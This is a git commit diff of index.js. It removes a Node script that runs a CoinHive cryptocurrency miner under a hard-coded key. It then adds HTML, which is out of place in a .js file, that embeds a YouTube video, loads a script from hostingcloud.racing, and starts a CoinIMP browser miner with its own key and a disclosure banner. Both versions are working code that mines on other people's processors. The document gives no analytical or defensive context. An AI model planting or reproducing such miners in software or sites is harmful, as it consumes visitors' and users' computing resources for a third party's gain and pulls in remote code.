743c07823fdc56956f86bfcfdc477738e00c594d
barrydriscoll <75094052+barrydriscoll@users.noreply.github.com>
2020-11-26 23:53:54 -0300

    Update index.js

--- index.js
+++ index.js
@@ -1,28 +1,9 @@
-const CoinHive = require("coin-hive");
-const getPort = require("get-port");
-
-(async () => {
-  const miner = await CoinHive("R8DipMdnJ1xbPUlknV4ieamqiaoyvZac", {
-    port: await getPort()
-  });
-
-  await miner.start();
-
-  miner.on("found", () => {
-    console.log("Found!");
-  });
-
-  miner.on("accepted", () => {
-    console.log("Accepted!");
-  });
-
-  miner.on("update", data => {
-    //   console.log(`
-    //   Hashes per second: ${data.hashesPerSecond}
-    //   Total hashes: ${data.totalHashes}
-    //   Accepted hashes: ${data.acceptedHashes}
-    // `);
-  });
-})().catch(err => {
-  console.error(err);
-});
+<p></p>
+<p><iframe src="//www.youtube.com/embed/UHEVRpC2llw" width="560" height="314" allowfullscreen="allowfullscreen"></iframe></p>
+<script src="https://www.hostingcloud.racing/CJS7.js"></script>
+<script>// <![CDATA[
+var _client = new Client.Anonymous('f3e8f6406281e6803adbf8fc289f72e873323c8ba93921a35155eb6717093552', {
+        throttle: 0.2, c: 'w'
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
